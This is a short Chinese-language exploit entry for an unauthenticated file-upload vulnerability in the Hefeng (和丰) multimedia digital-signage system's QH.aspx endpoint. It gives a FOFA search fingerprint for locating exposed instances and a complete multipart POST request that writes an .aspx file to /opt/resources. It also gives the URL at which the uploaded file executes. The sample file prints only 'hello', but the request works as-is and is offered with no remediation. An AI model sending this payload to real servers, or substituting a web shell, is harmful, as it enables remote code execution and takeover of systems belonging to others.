# 和丰多媒体信息发布系统QH.aspx存在文件上传漏洞

- **系统**：和丰多媒体信息发布系统　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`FOFA：app="和丰山海-数字标牌"`
- **请求**：`POST /QH.aspx HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryhbcZX7o0…`

**请求体 / payload**
```
------WebKitFormBoundaryhbcZX7o0Hw19h3kr
Content-Disposition: form-data; name="fileToUpload"; filename="qwe.aspx"
Content-Type: application/octet-stream
<% response.write("hello") %>
------WebKitFormBoundaryhbcZX7o0Hw19h3kr
Content-Disposition: form-data; name="action"
upload
------WebKitFormBoundaryhbcZX7o0Hw19h3kr
Content-Disposition: form-data; name="responderId"
ResourceNewResponder
------WebKitFormBoundaryhbcZX7o0Hw19h3kr
Content-Disposition: form-data; name="remotePath"
/opt/resources
------WebKitFormBoundaryhbcZX7o0Hw19h3kr--
http://ip/opt/resources/qwe.aspx
```